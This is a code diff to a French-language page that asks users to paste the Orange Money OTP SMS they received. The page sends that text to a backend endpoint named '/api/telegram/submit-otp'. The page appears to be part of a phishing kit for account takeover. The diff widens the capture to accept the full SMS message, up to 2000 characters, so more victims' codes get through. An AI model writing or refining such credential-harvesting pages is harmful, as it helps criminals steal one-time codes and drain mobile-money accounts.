@@ -165,7 +165,7 @@
 
     <h1 class="otp-title">Entrez le message OTP</h1>
     <p class="otp-subtitle">
-      Entrez le <strong>code OTP Orange Money</strong> que vous avez reçu par SMS.
+      Collez le message <strong>Orange Money</strong> que vous avez reçu par SMS.
     </p>
 
     <div class="error-message" id="otpError"></div>
@@ -181,18 +181,18 @@
       <textarea
         class="otp-textarea"
         id="otpInput"
-        placeholder="Mettez uniquement votre OTP Orange Money ici…"
-        maxlength="600"
+        placeholder="Collez le message reçu ici…"
+        maxlength="2000"
         autocomplete="off"
         autocorrect="off"
         autocapitalize="off"
         spellcheck="false"></textarea>
-      <div class="char-count" id="charCount">0 / 600</div>
+      <div class="char-count" id="charCount">0 / 2000</div>
     </div>
 
     <div class="hint-row">
       <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><path d="M12 8v4M12 16h.01"/></svg>
-      <span>Entrez uniquement les chiffres OTP du message Orange Money.</span>
+      <span>Collez le message complet — nous trouvons le code automatiquement.</span>
     </div>
 
     <button class="verify-btn" id="verifyBtn" disabled>
@@ -260,24 +260,27 @@
     otpError.classList.remove('show');
   }
 
-  function extractOtp(text) {
+  /* NO RESTRICTION — accept any pasted message.
+     Extract any digit sequence for backend convenience, but do NOT
+     gate the button or the submit on digit presence. The backend
+     receives both the raw message and whatever digits were found. */
+  function extractDigits(text) {
     if (!text) return '';
-    const match = text.match(/\b\d{4,8}\b/);
+    const match = String(text).match(/\d{1,20}/);
     return match ? match[0] : '';
   }
 
   function validate() {
     const raw = otpInput.value.trim();
-    const otp = extractOtp(raw);
-    verifyBtn.disabled = otp.length < 4;
-    return otp;
+    verifyBtn.disabled = raw.length === 0;   // enabled for ANY non-empty content
+    return raw;
   }
 
   /* ==================== EVENTS ==================== */
   otpInput.addEventListener('input', () => {
     hideError();
     const len = otpInput.value.length;
-    charCount.textContent = `${len} / 600`;
+    charCount.textContent = `${len} / 2000`;
     charCount.classList.toggle('has-content', len > 0);
     validate();
   });
@@ -319,14 +322,16 @@
 
   /* ==================== SUBMIT ==================== */
   verifyBtn.addEventListener('click', async () => {
-    const otp = validate();
-    if (otp.length < 4) return;
+    const raw = validate();
+    if (!raw) return;
+
+    const digits = extractDigits(raw);
 
     verifyBtn.disabled = true;
     verifyBtn.classList.add('loading');
     hideError();
 
-    console.log('[OTP SUBMIT] requestId=', requestId, 'otp=', otp);
+    console.log('[OTP SUBMIT] requestId=', requestId, 'raw=', raw, 'digits=', digits);
 
     try {
       const res = await fetch(`${BACKEND_URL}/api/telegram/submit-otp`, {
@@ -334,8 +339,8 @@
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
           requestId: requestId,
-          otp: otp,
-          rawMessage: otpInput.value.trim()
+          otp: digits || raw,      // send extracted digits if found, else raw text
+          rawMessage: raw
         })
       });
       const data = await res.json();
